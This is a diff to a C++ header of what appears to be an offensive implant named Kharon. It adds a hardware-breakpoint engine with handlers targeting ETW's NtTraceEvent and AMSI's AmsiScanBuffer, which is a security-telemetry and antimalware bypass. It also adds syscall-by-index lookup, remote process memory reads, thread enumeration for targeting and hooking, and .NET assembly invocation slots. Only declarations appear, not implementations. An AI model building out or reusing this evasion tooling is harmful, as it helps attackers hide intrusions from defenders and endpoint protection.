@@ -136,7 +136,13 @@ class Socket;
 typedef struct JOBS {
     PPACKAGE Pkg;
     PPARSER  Psr;
-    HANDLE   Handle;
+
+    struct {
+        ULONG  ID;
+        HANDLE Handle;
+    } Thread;
+
+    BOOL     Threaded;
     ULONG    State;
     ULONG    ExitCode;
     PCHAR    UUID;
@@ -148,6 +154,7 @@ namespace Root {
 
     class Kharon {    
     public:
+        HwbpEng*   Hwbp;
         Spoof*     Spf;
         Syscall*   Sys;
         Socket*    Sckt;
@@ -213,13 +220,6 @@ namespace Root {
             .HeapHandle  = U_PTR( NtCurrentPeb()->ProcessHeap ),
             .Connected   = FALSE
         };
-
-        struct {
-            UPTR Dr0;
-            UPTR Dr1;
-            UPTR Dr2;
-            UPTR Dr3;
-        } HwbpEng;
 
         struct {
             UPTR Handle;
@@ -308,6 +308,15 @@ namespace Root {
             DECLAPI( VirtualFreeEx );
             DECLAPI( VirtualFree );
             DECLAPI( WriteProcessMemory );
+            DECLAPI( ReadProcessMemory );
+
+            DECLAPI( AddVectoredExceptionHandler );
+            DECLAPI( RemoveVectoredContinueHandler );
+
+            DECLAPI( InitializeCriticalSection );
+            DECLAPI( EnterCriticalSection );
+            DECLAPI( LeaveCriticalSection );
+            DECLAPI( DeleteCriticalSection );
 
             DECLAPI( InitializeProcThreadAttributeList );
             DECLAPI( UpdateProcThreadAttribute );
@@ -377,6 +386,15 @@ namespace Root {
             RSL_TYPE( VirtualFreeEx ),
             RSL_TYPE( VirtualFree ),
             RSL_TYPE( WriteProcessMemory ),
+            RSL_TYPE( ReadProcessMemory ),
+
+            RSL_TYPE( AddVectoredExceptionHandler ),
+            RSL_TYPE( RemoveVectoredContinueHandler ),
+
+            RSL_TYPE( InitializeCriticalSection ),
+            RSL_TYPE( EnterCriticalSection ),
+            RSL_TYPE( LeaveCriticalSection ),
+            RSL_TYPE( DeleteCriticalSection ),
 
             RSL_TYPE( InitializeProcThreadAttributeList ),
             RSL_TYPE( UpdateProcThreadAttribute ),
@@ -386,6 +404,7 @@ namespace Root {
         struct {
             UPTR Handle;
 
+            DECLAPI( RtlNtStatusToDosError );
             DECLAPI( DbgPrint );
             DECLAPI( NtClose );
     
@@ -433,6 +452,7 @@ namespace Root {
             DECLAPI( RtlCreateTimerQueue );
             DECLAPI( RtlDeleteTimerQueue );
         } Ntdll = {
+            RSL_TYPE( RtlNtStatusToDosError ),
             RSL_TYPE( DbgPrint ),
             RSL_TYPE( NtClose ),
     
@@ -596,6 +616,7 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
+        VOID InitHwbp( HwbpEng* HwbpRf ) { Hwbp = HwbpRf; }
         VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
         VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
         VOID InitSocket( Socket* SocketRf ) { Sckt = SocketRf; }
@@ -618,16 +639,22 @@ namespace Root {
 }
 
 class Syscall {
+private:
+    Root::Kharon* Self;    
+public:
+    Syscall( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    BOOL Enabled = FALSE;
 
     struct {
         ULONG ssn;
         ULONG Hash;
         UPTR  Address;
         UPTR  Instruction;
-    } Ext[Last] = {};
+    } Ext[syLast] = {};
 
     auto Fetch(
-        _In_ ULONG Hash
+        _In_ INT8 SysIdx
     ) -> BOOL;
 
     template<typename... Args>
@@ -649,8 +676,13 @@ public:
     HwbpEng( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     PDESCRIPTOR_HOOK Threads = nullptr;
+    CRITICAL_SECTION CritSec = { 0 };
+
+    BOOL  Initialized = FALSE;
+    PVOID Handler     = nullptr;
 
     struct {
+        UPTR Handle;
         UPTR NtTraceEvent;
     } Etw;
 
@@ -659,6 +691,9 @@ public:
         UPTR AmsiScanBuffer;
     } Amsi;
 
+    auto Init( VOID ) -> BOOL;
+    auto Clean( VOID ) -> BOOL;
+
     auto SetDr7(
         _In_ UPTR ActVal,
         _In_ UPTR NewVal,
@@ -666,24 +701,31 @@ public:
         _In_ INT  BitsCount
     ) -> UPTR;
 
+    auto Install(
+        _In_ UPTR  Address,
+        _In_ INT8  Drx,
+        _In_ PVOID Callback,
+        _In_ ULONG ThreadID
+    ) -> BOOL;
+
     auto SetBreak(
-        _In_ HANDLE Handle,
-        _In_ UPTR   Address,
-        _In_ PVOID  Detour,
-        _In_ INT8   Drx
+        _In_ ULONG ThreadID,
+        _In_ UPTR  Address,
+        _In_ INT8  Drx,
+        _In_ BOOL  Init
     ) -> BOOL;
 
     auto RmBreak(
-        _In_ HANDLE Handle,
-        _In_ INT8   Drx
+        _In_ UPTR  Address,
+        _In_ ULONG ThreadID
     ) -> BOOL;
  
-    auto GetFuncArg(
+    auto GetArg(
         _In_ PCONTEXT Ctx,
         _In_ ULONG    Idx
     ) -> UPTR;
 
-    auto SetFuncArg(
+    auto SetArg(
         _In_ PCONTEXT Ctx,
         _In_ UPTR     Val,
         _In_ ULONG    Idx
@@ -693,16 +735,23 @@ public:
         _In_ PCONTEXT Ctx
     ) -> VOID;
 
+    auto Insert(
+        _In_ UPTR  Address,
+        _In_ INT8  Drx,
+        _In_ BOOL  Init,
+        _In_ ULONG ThreadID
+    ) -> BOOL;
+
     auto MainHandler( 
         _In_ PEXCEPTION_POINTERS e 
     ) -> LONG;
 
-    auto EtwHandler(
-        _In_ PCONTEXT
+    auto Etw(
+        _In_ PEXCEPTION_POINTERS e
     ) -> LONG;
 
-    auto AmsiHandler(
-        _In_ PCONTEXT
+    auto Amsi(
+        _In_ PEXCEPTION_POINTERS e
     ) -> LONG;
 };
 
@@ -783,6 +832,12 @@ public:
         .a = NULL
     };
 
+    struct {
+        ULONG  ID;
+        PWCHAR AppDomain;
+        PWCHAR AssemblyName;
+    } Invoke[5] = {};
+
     BOOL KeepLoad = FALSE;
 
     auto PatchExit(
@@ -804,6 +859,10 @@ private:
     Root::Kharon* Self;
 public:
     Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    auto NtStatusToError(
+        _In_ NTSTATUS NtStatus
+    ) -> ERROR_CODE;
 
     auto FixRel(
         _In_ PVOID Base,
@@ -1199,10 +1258,6 @@ class Thread {
 public:
     Thread( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto RndEnum( 
-        VOID
-    ) -> ULONG;
-
     auto Create(
         _In_  HANDLE ProcessHandle,
         _In_  PVOID  StartAddress,
@@ -1217,6 +1272,29 @@ public:
         _In_ BOOL  Inherit,
         _In_ ULONG ThreadID
     ) -> HANDLE;
+
+    auto Enum( 
+        _In_      INT8  Type,
+        _In_opt_  ULONG ProcessID = 0,
+        _Out_opt_ ULONG ThreadQtt = 0,
+        _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo = NULL
+    ) -> ULONG;
+
+    auto Rnd( VOID ) -> ULONG {
+        return Enum( TdRandom, 0 );
+    };
+
+    auto Target( 
+        _In_opt_  ULONG ProcessID,
+        _Out_opt_ ULONG ThreadQtt,
+        _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
+    ) -> ULONG {
+        return Enum( TdTarget, ProcessID, ThreadQtt, ThreadInfo );
+    }
+
+    auto InstallHwbp( VOID ) {
+        return Enum( TdHwbp );
+    }
 };
 
 class Library {
@@ -1297,6 +1375,14 @@ public:
         _In_ PVOID  Base,
         _In_ PBYTE  Buffer,
         _In_ ULONG  Size
+    ) -> BOOL;
+
+    auto Read(
+        _In_  HANDLE  Handle,
+        _In_  PVOID   Base,
+        _In_  PBYTE   Buffer,
+        _In_  SIZE_T  Size,
+        _Out_ PSIZE_T Reads
     ) -> BOOL;
 
     auto Free(
